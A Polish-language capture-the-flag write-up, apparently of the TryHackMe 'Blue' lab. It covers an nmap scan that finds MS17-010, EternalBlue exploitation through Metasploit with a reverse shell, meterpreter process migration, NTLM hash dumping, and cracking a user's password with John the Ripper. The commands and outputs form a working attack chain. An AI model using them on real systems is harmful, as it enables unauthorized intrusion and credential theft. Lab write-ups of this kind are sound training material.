
Pierwszym krokiem był skan usług na systemie za pomocą nmap.
Wykorzystując `nmap 10.10.238.3 -sS -sV --script vuln` otrzymano dokładne informacje o otwartych portach tcp na systemie wraz z wersją usług na nich oraz ze znanymi podatnościami.

```
Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
Kluczowa była odpowiedź o podatności SMB na porcie 445 i 139.

Następnie w metasploit framework wybrano exploit odpowiadający danemu CVE
```
msf6 auxiliary(scanner/netbios/nbname) > use 0                                                                                                         
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp                                                                           
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Dalej skonfigurowano opcje ataku:
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.238.3
rhosts => 10.10.238.3
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.21.251.149
lhost => 10.21.251.149
```

Dodatkowo w ramach ćwiczenia zmieniono payload z meterpreter/reverse_tcp na:
```
set payload windows/x64/shell/reverse_tcp
```

Kolejno wykonano exploit i zmieniono shell na meterpeter:
```
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 11? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -u 11
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [11]

[*] Upgrading session ID: 11
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.21.251.149:4433 
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
[*] Sending stage (203846 bytes) to 10.10.238.3
[*] Meterpreter session 12 opened (10.21.251.149:4433 -> 10.10.238.3:49178) at 2025-08-29 13:54:15 +0200
[*] Stopping exploit/multi/handler
```
Za pomocą `session -i 12` udało dostać się do systemu w ulepszonym shellu.
```
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 1612 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Dalszym korkiem ataku jest zmiana procesu w którym działa meterpreter na taki z pozwoleniami NT AUTHORITY\SYSTEM. W tym celu należy wpisać polecenie `ps` i znaleźć taki proces.
```
1296  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
```
Migracja do tego procesu:
```
meterpreter > migrate 1296
[*] Migrating from 2844 to 1296...
[*] Migration completed successfully.
```

Poleceniem `hashdump` można pobrać hashe haseł użytkowników systemu.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

W celu złamania hasha użytkownika Jon można skopiować jego hash `ffb43f0de35be4d9917ac0cc8ad57f8d` do pliku i wykorzystać narzędzie JohnTheRipper. Hash jest w formacie NTLM.

``` zsh
(wojciur1337㉿kali)-[~/TryHackMe/Cybersecurity101/Blue]
└─$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2025-08-29 14:16) 3.225g/s 32905Kp/s 32905Kc/s 32905KC/s alr19882006..alpis3092
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

Hasłem jest `alqfna22`.
